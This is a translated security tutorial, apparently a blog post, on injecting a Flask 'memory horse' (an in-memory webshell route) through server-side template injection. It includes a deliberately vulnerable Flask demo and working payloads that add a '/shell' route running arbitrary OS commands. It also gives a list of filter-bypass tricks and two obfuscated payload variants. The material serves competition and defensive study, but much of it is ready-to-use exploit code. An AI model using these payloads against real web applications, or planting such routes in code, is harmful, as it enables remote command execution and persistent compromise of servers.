# Python safe learning—Flask memory horse

Author: H3rmesk1t

This article was first published in [Prophet Community] (https://xz.aliyun.com/t/10933)

## Preface
When I was offline in Anxun Cup, there was an AWD question injected with the `Python SSTI` template. Since I had never been exposed to the offensive and defensive points about `Python` before, I was once planted by someone else. I haven't even discovered the `Python memory horse`. After I found that the patched question was hit in the game, I checked the traffic record and realized that the attacker used the `Flask` ​​memory horse to hit it. I have seen the general idea before but haven't learned it. I will record the relevant knowledge points here for the time being.

## concept
Commonly used Python frameworks include Django and Flask, both of which may have `SSTI` vulnerabilities. The `Python memory horse is implemented using `SSTI` injection in the `Flask` ​​framework. In the `Flask` ​​framework, `render_template_string` is used for rendering in the `web` application template rendering, but the code transmitted by the user is not filtered, resulting in the user being able to inject malicious code to implement the `Python` memory horse injection.

## Flask request context management mechanism
When a web page request enters `Flask`, a `Request Context` will be instantiated. There are two contexts in `Python`: request context (request context) and application context (session context). A request context encapsulates the request information, and the structure of the context uses a `Stack` stack structure, that is, it has all the characteristics of a stack. After instantiation of `request context`, it will be pushed to the stack`_request_ctx_stack`. Based on this feature, the current request can be obtained by obtaining the top element of the stack.

## Vulnerability Environment
First write a `SSTI-Demo` using `Flask`:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route('/')
def hello_world(): # put application's code here
    person = 'knave'
    if request.args.get('name'):
        person = request.args.get('name')
    template = '<h1>Hi, %s.</h1>' % person
    return render_template_string(template)


if __name__ == '__main__':
    app.run()
```

Original `Flask`Memory Horse`Payload`:

```python
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

Command execution result:

![](./images/1.png)

![](./images/1.png)

## Payload Analysis
Disassemble the previous `Payload` and analyze it layer by layer.

```python
url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule(
        '/shell',
        'shell',
        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
    )",
    {
        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
        'app':url_for.__globals__['current_app']
    }
)
```

For the `url_for.__globals__['__builtins__']['eval']`, `url_for` is a built-in function of `Flask`. The `__globals__` property can be called through the `Flask` ​​built-in function. This special property can return all variables in the module namespace where the function is located, including many `modules` that have been introduced. You can see that `__builtins__` is supported here.

![](./images/3.png)

![](./images/4.png)

In the `__builtins__` module, `Python` directly imports a lot of built-in functions for us when it is started. To be precise, `Python` will first load the built-in namespace when it is started. There are many mappings between names and objects in the built-in namespace. These names are the names of the built-in functions, and the objects are these built-in function objects. It can be seen that in the built-in functions of the `__builtins__` module, there are commands such as `eval`, `exec`, etc. to execute functions.

![](./images/5.png)

```python
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec
', 'exit', 'filter', 'float', 'format', 'frozensset', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

Since there is a command execution function, we can directly call the command execution function to perform dangerous operations. `Exploit` is as follows:

```python
{{url_for.__globals__['__builtins__']['eval']("__import__('os').system('open -a Calculator')")}}
```

![](./images/6.png)

Next, let's take a look at the `app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())` Payload. This part is a dynamically adding a route, and the function that handles the route is an anonymous function defined by the `lambda` keyword.

When registering routes in `Flask`, the `@app.route()` decorator was added to implement them. Follow up to check its source code implementation and found that it called the `add_url_rule` function to add routes.

![](./images/7.png)

Follow up on the `add_url_rule` function, and its parameters are as follows:
 - rule: The `URL` rule corresponding to the function, the condition meets the same as the first parameter of `app.route`, and must start with `/`.
 - endpoint: Endpoint, that is, when using `url_for` for inversion, the first parameter passed here is the value corresponding to `endpoint`. This value can also be not specified. By default, the name of the function will be used as the value of `endpoint`.
 - view_func: The function corresponding to `URL`, here you only need to write the function name without adding brackets.
 - provide_automatic_options: Controls whether options methods should be added automatically.
 - options: Options to forward to the underlying rule object.

![](./images/8.png)

`lambda` is anonymous function. The third parameter of the `add_url_rule` function in `Payload` defines a `lambda` anonymous function, where the `cmd` parameter value obtained from the `Web` request is executed through the `popen` function of the `os` library and returns the result, where the parameter value defaults to `whoami`.

Let's take a look at the `'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']}`. `_request_ctx_stack` is a global variable of `Flask` ​​and is an instance of `LocalStack`. Here `_request_ctx_stack` is `_request_ctx_stack` in the `Flask request context management mechanism mentioned above. `app` is also a global variable of `Flask`, which is the current `app`.

At this point, the general logic has been basically sorted out. The function of the `eval` function dynamically creates a route, and then specifies the global namespace of the required variables to ensure that both `app` and `_request_ctx_stack` can be found.

## ByPass
Filtering is often present in practical applications, so it is still necessary to understand how to bypass it.
 - `url_for` can be replaced with `get_flashed_messages` or `request.__init__` or `request.application`.
 - Code executes function replacement, such as `exec`, etc., replace `eval`.
 - The string can be spliced, such as `['__builtins__']['eval']` to `['__bui'+'ltins__']['ev'+'al']`.
 - `__globals__` can be replaced with `__getattribute__('__globa'+'ls__')`.
 - `[]` can be replaced with `.__getitem__()` or `.pop()`.
 - Filtering `{{` or `}}` can be bypassed using `{%` or `%}`. `if` statement can be executed in the middle. This can be used to perform blind-like operations or take-out code execution results.
 - Filtering `_` can be bypassed with encoding, such as `__class__` with `\x5f\x5fclass\x5f\x5f`, and can also be bypassed with `dir(0)[0][0]` or `request['args']` or `request['values']`.
 - Filtered `.` can be bypassed with `attr()` or `[]`.
 - For other techniques, please refer to the `SSTI` method to bypass filtering...

Here are two deformations `Payload`:
 - Original `Payload`

```python
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/h3rmesk1t', 'h3rmesk1t', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

 - Deformation`Payload-1`

```python
request.application.__self__._get_data_for_json.__getattribute__('__globa'+'ls__').__getitem__('__bui'+'ltins__').__getitem__('ex'+'ec')("app.add_url_rule('/h3rmesk1t', 'h3rmesk1t', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell', 'calc')).read())",{'_request_ct'+'x_stack':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('_request_'+'ctx_stack'),'app':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('curre'+'nt_app')})
```

 - Deformation`Payload-2`

```python
get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\u0065\u0076\u0061\u006c")("app.add_ur"+"l_rule('/h3rmesk1t', 'h3rmesk1t', la"+"mbda :__imp"+"ort__('o"+"s').po"+"pen(_request_c"+"tx_stack.to"+"p.re"+"quest.args.get('shell')).re"+"ad())",{'\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u006 3\u006b':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\
u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b"),'app':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x 5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070")})
```

![](./images/10.png)

## refer to
 - [A brief analysis of Python Flask memory horse](https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/)